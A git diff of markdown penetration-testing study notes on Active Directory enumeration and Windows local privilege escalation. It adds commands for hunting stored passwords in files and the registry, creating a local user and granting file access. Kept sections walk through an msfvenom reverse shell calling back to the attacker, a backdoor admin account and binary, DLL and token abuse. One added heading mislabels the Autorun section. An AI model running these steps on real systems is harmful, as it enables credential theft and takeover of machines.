@@ -366,6 +366,7 @@ Get the ACLs associated with the specified path
 ```
 Get-PathAcl -Path "\\dc.mydomain.local\sysvol" 
 ```
+---
 
 # Domain Enumeration - Trusts Enumeration
 
@@ -419,6 +420,8 @@ Map External trusts in meneycorp.local forest
 Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
 ```
 
+---
+
 # User Hunting
 Find all machines on the current domain where the current user has local admin access (admin access in another machine)
 ```
@@ -450,11 +453,72 @@ Get groups with privileges in other domains inside the forest
 Get-DomainForeignGroupMember 
 ```
 
+---
+
 # Active Directory - Local Privilege Escalation
 
-# <span style="color:lightblue">Autorun</span>
+Windows Enumeration:
+- system enum
+```
+systeminfo
+check the patches (HotFixes) --> wmic qfe
+list the drives ex. C: D: --> wimc logicaldisk
+list the drives ex. C: D: --> wmic logicaldisk get caption,description,providername
+gather information about a file --> get-content file.lnk
+```
+- user enum and groups
+```
+user that you are logged in with --> whoami
+check user privilege --> whoami /priv
+check the group that you are belonging to --> whoami /groups
+show all users on the machine --> net user
+gather info about X user --> net user <username>
+check all users in X group --> localgroup <groupname>
+```
+- network enum
+```
+ipconfig /all
+check all IPs that are connected to the machine --> arp -a
+check what other machines are communicating to the machine (Possible to Pivoting) --> route print
+check open ports on the machine (Possible to port forwarding) --> netstat -ano
+```
+- password hunting (passwords are in files). make sure in which directory you are then run the command. you also can run the command in the root directory
+-     findstr /si password *.txt *.ini *.config
+- firewall & Antivirus
+ ```
+find info about particular services like windefend --> sc query windefend
+list all running services on the machine --> sc queryex type= service
+check firewall settings --> netsh firewall show state OR netsh advfirewall firewall dump
+```
+- Windows-exploit-suggester usage:
+  1- run 'systeminfo' and save it into a <sysinfo.txt>
+  2- download and extract the tool from Git Hub.
+  3- install pip if you don't have it --> curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py && pip install xlrd --upgarde
+  4- Update the database --> ./windows-exploit-suggester.py --update
+  5- ./windows-exploit-suggester.py --database <updatedDB.xls> --systeminfo <sysinfo.txt>
+  
+- Stored Passwords
+- check the registry. you may find a default password
+-     reg query HKLM /f password /t REG_SZ /s
+- if you find any default password run the following
+-     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+- if SSH is running on the system use the found credentials to login
 
-## <span style="color:lightgreen"><span style="color:lightgreen">Methodology</span></span>
+**keep in mind to check the permissions in windows like icacls, icacls root.txt /grant <username>:F (this will grant full access to a file)**
+transferring a file in windows using pyftpdlib
+-     python -m pyftpdlib 21 (attacker machine)
+-     ftp 10.0.2.10
+Add a user
+-     net user raman to0or /add
+
+you can use the below tools for complete coverage
+- PowerUp   https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+- Privesc   https://github.com/enjoiz/Privesc
+- winPEAS   https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+
+# <span style="color:lightblue">AlwaysInstallElevated</span>
+
+## <span style="color:lightgreen">Methodology</span>
 
 Autorun is a type of Registry Escalation.
 
@@ -462,19 +526,18 @@ To ensure that the IT department creates a secure environment, Windows administr
 
 So basically, we can say a particular application in a specific directory gets automatically executed with administrator privileges once he logs on. This can be abused by finding the path location and dropping our malicious executable file through which we will gain administrator access.
 
-## <span style="color:lightgreen">Detection</span>
-
 ### Using Autoruns and AccessChk
 
-1. Transfer [Autoruns64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) on the Windows/AD machine and execute it on cmd
+1. Transfer [Autoruns64.exe]([https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)) on the Windows/AD machine and execute it on cmd
 ```console
 C:\Temp> Autoruns64.exe
 ```
-![image](https://user-images.githubusercontent.com/59029171/161002365-bde92ae0-b7f4-4978-b2eb-44498e6c42fb.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/91e45f42-3bf4-4503-a88d-b5ec77207f3b)
+
 
 2. In Autoruns, click on the `"Logon"` tab.
 3. From the listed results, notice that the `"My Program"` entry is pointing to `"C:\Program Files\Autorun Program\program.exe"`.
-4. Go back to the command prompt run [AccessChk64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
+4. Go back to the command prompt run [AccessChk64.exe]([https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk))
 
 ```console
 C:\Temp> accesschk64.exe -wvu "C:\Program Files\Autorun Program"
@@ -485,7 +548,8 @@ C:\Temp> accesschk64.exe -wvu "C:\Program Files\Autorun Program"
 # u --> ignore the errors
 ```
 
-![image](https://user-images.githubusercontent.com/59029171/161004322-76f2e4e8-876c-4c00-abf5-7e0be381fdfd.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2e31e838-22b0-4aa4-be5f-02dd129b0630)
+
 
 ### Using PowerUp
 
@@ -496,7 +560,8 @@ C:\Temp> powershell -ep bypass
 PS C:\Temp>. .\PowerUp.sp1
 PS C:\Temp> Invoke-AllChecks
 ```
-![image](https://user-images.githubusercontent.com/59029171/161005302-73ecbb10-e186-4a84-b086-c271976655f5.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3c45bf70-456b-40c0-9d3c-e27616c73b78)
+
 
 From the output, notice that the `"Everyone"` user group has `"FILE_ALL_ACCESS"` permission on the `"program.exe"` file. To gain administrator access, we can drop our malicious executable file by overwriting on the file.
 
@@ -523,12 +588,11 @@ $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o p
 
 1. Wait for a reverse shell on your kali machine.
 
-
 # <span style="color:lightblue">AlwaysInstallElevated</span>
 
 ## <span style="color:lightgreen">Methodology</span>
 
-AlwaysInstallElevated  is a type of Registry Escalation.
+# AlwaysInstallElevated  is a type of Registry Escalation.
 
 This option is equivalent to granting full administrative rights, which can pose a massive security risk. Microsoft strongly discourages the use of this setting.
 
@@ -548,14 +612,16 @@ If the AlwaysInstallElevated value is not set to "1" under both of the preceding
 C:\Temp> reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 ```
 + `0x1` means its ON
-![image](https://user-images.githubusercontent.com/59029171/161007111-57c898d9-d830-45a5-9a2c-f9e867f6c58b.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7f8ab42c-77c2-4e52-b0d7-06fdf5ccd1fd)
+
 
 2. In command prompt type: 
 ```console
 C:\Temp>reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
 + `0x1` means its ON
-![image](https://user-images.githubusercontent.com/59029171/161007974-38e7b355-0c5e-49ff-9886-6878bbbe86a6.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/636ded17-c70b-4b17-9db0-f4882108d54a)
+
 
 From the both output, we notice that `“AlwaysInstallElevated”` value is `1`. Hence, we can abuse this function to get privilege escalation.
 
@@ -568,11 +634,13 @@ PS C:\Temp>. .\PowerUp.sp1
 PS C:\Temp> Invoke-AllChecks
 ```
 
-![image](https://user-images.githubusercontent.com/59029171/161008622-848721f3-ddf2-4c17-af2a-a8e7f592a3e1.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5d2380a0-2ecd-4bc2-a73c-fd5d44d9d762)
+
 
 2. Run `Write-UserAddMSI` and Add backdoor user in *Administrators* group (Required RDP access)
 
-![image](https://user-images.githubusercontent.com/59029171/161009230-2b8b4782-60cc-4301-b1ac-d9595b34c392.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/53dd5cb6-8e32-49e8-9f33-9c84f883018d)
+
 
 3. Check local Administrators
 ```console
@@ -621,7 +689,8 @@ A service registry consists of a cluster of servers that use a replication proto
 C:\Temp> powershell -ep bypass
 PS C:\Temp> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
 ```
-![image](https://user-images.githubusercontent.com/59029171/161015556-54353fa3-1278-451d-999e-38c3cc762f75.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5cd1c41a-e02b-4645-a846-4964f6cc6c53)
+
 
 2. Notice that the output suggests that user belong to `"NT AUTHORITY\INTERACTIVE"` has `"FullContol"` permission over the registry key.
 
@@ -653,7 +722,8 @@ C:\Temp> sc start regsvc
 # If it doesnt work try restaring the service and perform the exploit egain
 ```
 
-![image](https://user-images.githubusercontent.com/59029171/161016977-7757f360-5b46-4201-949a-9338e79f5735.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/80be99bc-4576-4ddb-a3d2-a2880c33864b)
+
 
 ### Kali VM
 
@@ -676,7 +746,8 @@ PS C:\Temp>. .\PowerUp.sp1
 PS C:\Temp> Invoke-AllChecks
 ```
 
-![image](https://user-images.githubusercontent.com/59029171/161047964-59d53aa2-ebd2-4cb3-85e7-5e103e19c4e1.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d4167972-4387-4324-a03b-d9a4e951b055)
+
 
 We can see that we have Modifiable File access to `"c:\Program Files\File Permissions Service\filepermservice.exe"`. To gain administrator access, we can drop our malicious executable file on this location.
 
@@ -726,7 +797,8 @@ So basically, we need full access to the Startup folder. Then by dropping our ma
 ```console
 C:\Temp> icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 ```
-![image](https://user-images.githubusercontent.com/59029171/161051050-c4b5745a-3040-4d65-8146-e67d66a3ffd3.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/12f85b86-6240-4ec0-add1-168afce6b7e7)
+
 
 2. From the output notice that the `"BUILTIN\Users"` group has full access `'(F)'` to the directory.
 
@@ -788,17 +860,21 @@ In case the application uses a relative and not an absolute file path, Windows s
 7. In the input box on the same line type: `NAME NOT FOUND`.
 8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the `'Add'` button, then `'Apply'` and lastly on 'OK'.
 
-![image](https://user-images.githubusercontent.com/59029171/161053850-6638a245-75dd-43ea-bbe9-6fecd33ad4c5.png)
-![image](https://user-images.githubusercontent.com/59029171/161053869-d2daa643-a03a-4956-a2f0-d5e74457d816.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/68c1f9b7-3c68-47b8-bf39-40b61e4190ad)
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/b5d988cc-d12f-4aa3-975d-684357add0d8)
+
 
 9. Open command prompt and type: 
 ```console
 C:\Temp> sc start dllsvc
 ```
-![image](https://user-images.githubusercontent.com/59029171/161053895-44130b44-4f86-4fe7-8ed2-0f9721fb5896.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/489d87f3-c022-477d-b4c8-1596cf36536e)
+
 
 10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute `'C:\Temp\hijackme.dll'` yet it could not do that as the file was not found. Note that `'C:\Temp'` is a writable location.
-![image](https://user-images.githubusercontent.com/59029171/161053920-4af50faa-c6ec-487e-9ec5-142907940e3c.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7e158da5-450c-47b4-addb-f7b6a9abe453)
+
 
 ## <span style="color:lightgreen">Exploitation</span>
 
@@ -846,7 +922,8 @@ C:\Temp> powershell -ep bypass
 PS C:\Temp>. .\PowerUp.sp1
 PS C:\Temp> Invoke-AllChecks
 ```
-![image](https://user-images.githubusercontent.com/59029171/161123056-908dbaa0-fced-490f-a158-9d2f20661d31.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/aff13a5b-82aa-486b-b7ed-8b23ca523762)
+
 
 ### Checking manually on Windows VM
 
@@ -862,20 +939,23 @@ C:\Temp> accesschk64.exe -uwcv Everyone *
 # c --> displays service name of the following
 # Everyone --> means everyone as a group who hass access
 ```
-![image](https://user-images.githubusercontent.com/59029171/161123809-4f85ab02-1d83-46a8-8f9c-2be2fc85a43d.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/732f0827-ca4d-4abe-8c76-bd679036255a)
+
 
 2. Using [AccessChk64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) query the service found
 ```console
 C:\Temp> accesschk64.exe -uwcv daclsvc
 ```
-![image](https://user-images.githubusercontent.com/59029171/161124072-a5fb8b5e-5d0c-4cf5-8551-f63b33ad4b9d.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/385c8683-a242-4417-bfbc-9414e6dbd5a6)
+
 
 3. Find path of the bin file
 ```console
 C:\Temp> sc qc daclsvc
 ```
 
-![image](https://user-images.githubusercontent.com/59029171/161124205-51cf18ef-d3a8-457d-b65a-1545c310c7b9.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d611d97c-fc41-4442-8ac5-68cc8f37c35e)
+
 
 ##  <span style="color:lightgreen">Exploitation</span>
 
@@ -924,7 +1004,8 @@ PS C:\Temp>. .\PowerUp.sp1
 PS C:\Temp> Invoke-AllChecks
 ```
 
-![image](https://user-images.githubusercontent.com/59029171/161141363-e21f53f1-1e4c-4006-ade0-b30e7286f4af.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/54c3e5a4-cc2c-4627-bb7e-fb1b5540a042)
+
 
 ##  <span style="color:lightgreen">Exploitation</span>
 ### Kali VM
@@ -969,7 +1050,8 @@ This privilege allows us to impersonate a token of a privileged account such as 
 ```console
 C:\Temp>whoami /priv
 ```
-![image](https://user-images.githubusercontent.com/59029171/161144004-97322646-a231-4fef-afd8-239570f44f8c.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/34cc6333-eed0-4a6e-9c1e-1b71acb87944)
+
 
 ##  <span style="color:lightgreen">Exploitation</span>
 
@@ -1028,7 +1110,8 @@ Hot Potato takes advantage of known issues in Windows to gain local privilege es
 ```console
 C:\Temp> whoami /priv
 ```
-![image](https://user-images.githubusercontent.com/59029171/161144004-97322646-a231-4fef-afd8-239570f44f8c.png)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/07560756-a313-4826-b33a-78f1e51765d9)
+
 
 ##  <span style="color:lightgreen">Exploitation</span>
 
